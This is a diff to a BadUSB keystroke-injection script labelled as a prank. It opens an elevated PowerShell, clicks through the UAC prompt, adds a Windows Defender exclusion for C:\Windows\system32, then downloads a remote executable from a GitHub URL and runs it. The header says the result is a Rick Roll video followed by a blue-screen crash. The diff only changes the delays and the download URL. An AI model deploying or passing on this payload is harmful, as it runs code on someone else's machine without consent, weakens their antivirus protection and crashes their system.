@@ -5,18 +5,18 @@ REM Props: Hak5, bemxio for creating mario-head https://github.com/bemxio/mario-
 REM Version: 1.0
 REM Category: Prank
 REM Display a video of a rick rolll, the video glitches and explodes and invokes a BSOD.
-DELAY 400
+DELAY 2000
 GUI r
-DELAY 500
+DELAY 2000
 STRING powershell Start-Process powershell -Verb runAs
 CTRL-SHIFT ENTER
-DELAY 850
+DELAY 2000
 SHIFT TAB
-DELAY 500
+DELAY 2000
 ENTER
-DELAY 1000
+DELAY 2000
 STRING Add-MpPreference -ExclusionPath C:\Windows\system32
 ENTER
-DELAY 500
-STRING $down=New-Object System.Net.WebClient;$url='https://github.com/AGO061/rickroll-bsod/releases/download/first-version/rick_dist.exe';$file='rick_dist.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit
+DELAY 2000
+STRING $down=New-Object System.Net.WebClient;$url='https://github.com/nullze/Flipper-Zero-BadKB-Files/raw/main/Windows/Pranks/Files/rick_dist.exe';$file='rick_dist.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit
 ENTER
